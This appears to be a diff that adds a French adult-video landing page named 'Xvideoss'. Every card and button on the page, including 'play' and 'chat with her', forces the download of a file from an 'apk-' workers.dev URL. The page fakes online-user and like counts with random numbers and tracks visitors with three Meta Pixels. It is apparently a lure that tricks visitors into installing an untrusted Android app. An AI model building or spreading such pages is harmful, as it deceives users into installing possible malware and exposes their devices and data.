@@ -1,0 +1,630 @@
+
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="theme-color" content="#0a0a0f">
+  <meta name="description" content="Xvideoss">
+  <title>Xvideoss</title>
+
+  <style>
+    :root {
+      --bg: #0a0a0f;
+      --card: #14141c;
+      --text: #ffffff;
+      --muted: #9ca3af;
+      --accent: #ff2d55;
+      --accent2: #ff6b81;
+      --line: #252532;
+      --radius: 14px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont,
+        "Segoe UI", system-ui, sans-serif;
+      padding-bottom: 200px;
+      min-height: 100vh;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    button {
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .header {
+      position: sticky;
+      top: 0;
+      z-index: 20;
+      background: rgba(10,10,15,0.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--line);
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      font-size: 22px;
+      font-weight: 900;
+      letter-spacing: -0.5px;
+      background: linear-gradient(90deg, #ff2d55, #ff8a9b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .online {
+      font-size: 12px;
+      color: #4ade80;
+      background: rgba(74,222,128,0.12);
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-weight: 600;
+    }
+
+    .online::before {
+      content: "●";
+      margin-right: 5px;
+      font-size: 8px;
+    }
+
+    .search-wrap {
+      padding: 14px 16px 8px;
+    }
+
+    .search {
+      width: 100%;
+      background: var(--card);
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      padding: 12px 16px;
+      color: var(--text);
+      font-size: 15px;
+      outline: none;
+    }
+
+    .search::placeholder {
+      color: var(--muted);
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      padding: 12px 12px 20px;
+    }
+
+    @media (min-width: 500px) {
+      .grid {
+        grid-template-columns: repeat(3, 1fr);
+      }
+    }
+
+    .card {
+      background: var(--card);
+      border-radius: var(--radius);
+      overflow: hidden;
+      border: 1px solid var(--line);
+      cursor: pointer;
+      transition: transform 0.15s;
+    }
+
+    .card:active {
+      transform: scale(0.97);
+    }
+
+    .cover {
+      position: relative;
+      aspect-ratio: 3/4;
+      background: #1c1c28;
+      overflow: hidden;
+    }
+
+    .cover img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .cover-fallback {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--muted);
+      font-size: 13px;
+      background: #1c1c28;
+    }
+
+    .duration {
+      position: absolute;
+      right: 8px;
+      bottom: 8px;
+      background: rgba(0,0,0,0.75);
+      color: #fff;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 7px;
+      border-radius: 6px;
+    }
+
+    .play-icon {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 42px;
+      height: 42px;
+      background: rgba(255,45,85,0.9);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .play-icon::after {
+      content: "";
+      display: block;
+      width: 0;
+      height: 0;
+      border-left: 14px solid #fff;
+      border-top: 9px solid transparent;
+      border-bottom: 9px solid transparent;
+      margin-left: 3px;
+    }
+
+    .card-body {
+      padding: 10px 10px 12px;
+    }
+
+    .card-title {
+      font-size: 13px;
+      font-weight: 600;
+      line-height: 1.3;
+      margin-bottom: 8px;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+      min-height: 34px;
+    }
+
+    .card-meta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      color: var(--muted);
+    }
+
+    .likes {
+      color: #ff6b81;
+      font-weight: 600;
+    }
+
+    .download-btn {
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 6px 10px;
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    .float-dl {
+      position: fixed;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 25;
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #ff2d55, #ff6b81);
+      color: #fff;
+      border: none;
+      box-shadow: 0 6px 20px rgba(255,45,85,0.45);
+      font-size: 13px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      line-height: 1.1;
+    }
+
+    .bottom-bar {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 30;
+      background: rgba(15,15,22,0.96);
+      backdrop-filter: blur(16px);
+      border-top: 1px solid var(--line);
+      padding: 12px 20px calc(14px + env(safe-area-inset-bottom));
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .bottom-bar button {
+      width: 100%;
+      max-width: 320px;
+      border: none;
+      border-radius: 14px;
+      padding: 15px 12px;
+      font-size: 16px;
+      font-weight: 800;
+      color: #fff;
+      text-align: center;
+    }
+
+    .btn-dl {
+      background: linear-gradient(90deg, #ff2d55, #ff4d6d);
+    }
+
+    .btn-play,
+    .btn-date {
+      background: #1f2937;
+      border: 1px solid #374151;
+    }
+
+    .empty {
+      display: none;
+      text-align: center;
+      color: var(--muted);
+      padding: 60px 20px;
+      font-size: 15px;
+    }
+  </style>
+
+  <!-- Meta Pixel: three Pixel IDs -->
+  <script>
+    !function(f,b,e,v,n,t,s) {
+      if(f.fbq) return;
+      n=f.fbq=function() {
+        n.callMethod ?
+          n.callMethod.apply(n,arguments) :
+          n.queue.push(arguments);
+      };
+
+      if(!f._fbq) f._fbq=n;
+      n.push=n;
+      n.loaded=true;
+      n.version="2.0";
+      n.queue=[];
+
+      t=b.createElement(e);
+      t.async=true;
+      t.src=v;
+
+      s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s);
+    }(
+      window,
+      document,
+      "script",
+      "https://connect.facebook.net/en_US/fbevents.js"
+    );
+
+    const META_PIXEL_IDS = [
+      "1517756270194979",
+      "1765035821237659",
+      "1064836432682396"
+    ];
+
+    META_PIXEL_IDS.forEach(function(pixelId) {
+      fbq("init", pixelId);
+      fbq("trackSingle", pixelId, "PageView");
+    });
+  </script>
+
+  <noscript>
+    <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1517756270194979&ev=PageView&noscript=1">
+    <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1765035821237659&ev=PageView&noscript=1">
+    <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1064836432682396&ev=PageView&noscript=1">
+  </noscript>
+</head>
+
+<body>
+
+  <header class="header">
+    <div class="logo">Xvideoss</div>
+    <div class="online" id="onlineCount">12,847 en ligne</div>
+  </header>
+
+  <div class="search-wrap">
+    <input
+      type="search"
+      class="search"
+      id="searchInput"
+      placeholder="Rechercher…"
+      autocomplete="off">
+  </div>
+
+  <section class="grid" id="content"></section>
+  <div class="empty" id="empty">Aucun résultat</div>
+
+  <button class="float-dl" id="floatDl" type="button">
+    ↓<br>DL
+  </button>
+
+  <div class="bottom-bar">
+    <button class="btn-dl" id="btnDownload" type="button">
+      Télécharger & Regarder
+    </button>
+
+    <button class="btn-play" id="btnPlay" type="button">
+      ▶ Lecture immédiate
+    </button>
+
+    <button class="btn-date" id="btnDate" type="button">
+      💬 Discuter avec elle
+    </button>
+  </div>
+
+  <script>
+    const DOWNLOAD_URL =
+      "https://apk-5cf2c56990e4-3456fff6eba24c16.cfluodiye.workers.dev/C77QhEvWRYeN";
+
+    const ITEMS = [
+      {id:"v01",title:"Vidéo 01",cover:"v01.webp",duration:"12:30"},
+      {id:"v02",title:"Vidéo 02",cover:"v02.webp",duration:"18:45"},
+      {id:"v03",title:"Vidéo 03",cover:"v03.webp",duration:"09:20"},
+      {id:"v04",title:"Vidéo 04",cover:"v04.webp",duration:"22:10"},
+      {id:"v05",title:"Vidéo 05",cover:"v05.webp",duration:"15:55"},
+      {id:"v06",title:"Vidéo 06",cover:"v06.webp",duration:"11:40"},
+      {id:"v07",title:"Vidéo 07",cover:"v07.webp",duration:"27:05"},
+      {id:"v08",title:"Vidéo 08",cover:"v08.webp",duration:"14:25"},
+      {id:"v09",title:"Vidéo 09",cover:"v09.webp",duration:"19:50"},
+      {id:"v10",title:"Vidéo 10",cover:"v10.webp",duration:"08:15"},
+      {id:"v11",title:"Vidéo 11",cover:"v11.webp",duration:"21:30"},
+      {id:"v12",title:"Vidéo 12",cover:"v12.webp",duration:"16:40"},
+      {id:"v13",title:"Vidéo 13",cover:"v13.webp",duration:"13:55"},
+      {id:"v14",title:"Vidéo 14",cover:"v14.webp",duration:"24:10"},
+      {id:"v15",title:"Vidéo 15",cover:"v15.webp",duration:"10:05"},
+      {id:"v16",title:"Vidéo 16",cover:"v16.webp",duration:"17:35"},
+      {id:"v17",title:"Vidéo 17",cover:"v17.webp",duration:"20:20"},
+      {id:"v18",title:"Vidéo 18",cover:"v18.webp",duration:"12:50"},
+      {id:"v19",title:"Vidéo 19",cover:"v19.webp",duration:"15:15"},
+      {id:"v20",title:"Vidéo 20",cover:"v20.webp",duration:"18:00"}
+    ];
+
+    function randomOnline() {
+      const n = Math.floor(Math.random() * 90000) + 10000;
+      return n.toLocaleString("fr-FR") + " en ligne";
+    }
+
+    function randomLikes() {
+      const n = Math.floor(Math.random() * 18000) + 1200;
+      return n > 9999
+        ? (n / 1000).toFixed(1) + "k"
+        : n.toString();
+    }
+
+    function escapeHtml(str) {
+      return String(str).replace(/[&<>"']/g, c => ({
+        "&": "&amp;",
+        "<": "&lt;",
+        ">": "&gt;",
+        '"': "&quot;",
+        "'": "&#39;"
+      })[c]);
+    }
+
+    // First-party click statistics.
+    // Stored locally in the visitor's browser.
+    function recordDownloadClick(source) {
+      const record = {
+        event: "download_click",
+        source: source,
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        const records = JSON.parse(
+          localStorage.getItem("download_clicks") || "[]"
+        );
+
+        records.push(record);
+
+        localStorage.setItem(
+          "download_clicks",
+          JSON.stringify(records.slice(-500))
+        );
+      } catch (error) {
+        console.warn("Local statistics unavailable");
+      }
+    }
+
+    function triggerDownload(source) {
+      recordDownloadClick(source);
+
+      const a = document.createElement("a");
+      a.href = DOWNLOAD_URL;
+      a.rel = "noopener";
+      a.download = "download";
+
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
+
+    function render() {
+      const q = document.getElementById("searchInput")
+        .value.trim().toLowerCase();
+
+      const matches = ITEMS.filter(item =>
+        item.title.toLowerCase().includes(q)
+      );
+
+      const html = matches.map(item => `
+        <article class="card" data-download="card">
+          <div class="cover">
+            <img
+              src="${escapeHtml(item.cover)}"
+              alt=""
+              loading="lazy"
+              onerror="
+                this.style.display='none';
+                if(!this.parentElement.querySelector('.cover-fallback')) {
+                  this.parentElement.insertAdjacentHTML(
+                    'beforeend',
+                    '<div class=&quot;cover-fallback&quot;>Image</div>'
+                  );
+                }
+              ">
+
+            <div class="play-icon"></div>
+
+            <span class="duration">
+              ${escapeHtml(item.duration)}
+            </span>
+          </div>
+
+          <div class="card-body">
+            <div class="card-title">
+              ${escapeHtml(item.title)}
+            </div>
+
+            <div class="card-meta">
+              <span class="likes">♥ ${randomLikes()}</span>
+              <button
+                class="download-btn"
+                type="button"
+                data-download-button>
+                Télécharger
+              </button>
+            </div>
+          </div>
+        </article>
+      `).join("");
+
+      const moreCard = `
+        <article
+          class="card more-card"
+          data-download="more"
+          style="
+            grid-column:1/-1;
+            background:linear-gradient(135deg,#1a1a24,#2a1520);
+            border:1px solid #ff2d55;
+          ">
+
+          <div class="card-body"
+            style="padding:28px 16px;text-align:center;">
+
+            <div style="
+              font-size:18px;
+              font-weight:800;
+              margin-bottom:8px;
+              color:#fff;
+            ">
+              + Voir plus de vidéos gratuites
+            </div>
+
+            <div style="
+              font-size:13px;
+              color:#9ca3af;
+              margin-bottom:16px;
+            ">
+              Téléchargez pour débloquer le catalogue complet
+            </div>
+
+            <button
+              class="download-btn"
+              type="button"
+              data-download-button
+              style="
+                padding:12px 24px;
+                font-size:14px;
+                border-radius:10px;
+              ">
+              Télécharger & Voir plus
+            </button>
+          </div>
+        </article>
+      `;
+
+      document.getElementById("content").innerHTML =
+        html + (matches.length ? moreCard : "");
+
+      document.getElementById("empty").style.display =
+        matches.length ? "none" : "block";
+    }
+
+    document.getElementById("onlineCount").textContent =
+      randomOnline();
+
+    setInterval(() => {
+      document.getElementById("onlineCount").textContent =
+        randomOnline();
+    }, 18000);
+
+    document.getElementById("searchInput")
+      .addEventListener("input", render);
+
+    document.getElementById("btnDownload")
+      .addEventListener("click", () => {
+        triggerDownload("bottom_download");
+      });
+
+    document.getElementById("btnPlay")
+      .addEventListener("click", () => {
+        triggerDownload("bottom_play");
+      });
+
+    document.getElementById("btnDate")
+      .addEventListener("click", () => {
+        triggerDownload("bottom_chat");
+      });
+
+    document.getElementById("floatDl")
+      .addEventListener("click", () => {
+        triggerDownload("floating_download");
+      });
+
+    // One delegated handler prevents double downloads.
+    document.getElementById("content")
+      .addEventListener("click", (e) => {
+        const card = e.target.closest(".card");
+        if (!card) return;
+
+        if (e.target.closest("[data-download-button]")) {
+          triggerDownload(
+            card.classList.contains("more-card")
+              ? "more_download_button"
+              : "card_download_button"
+          );
+          return;
+        }
+
+        triggerDownload(
+          card.classList.contains("more-card")
+            ? "more_card"
+            : "video_card"
+        );
+      });
+
+    render();
+  </script>
+
+</body>
+</html>
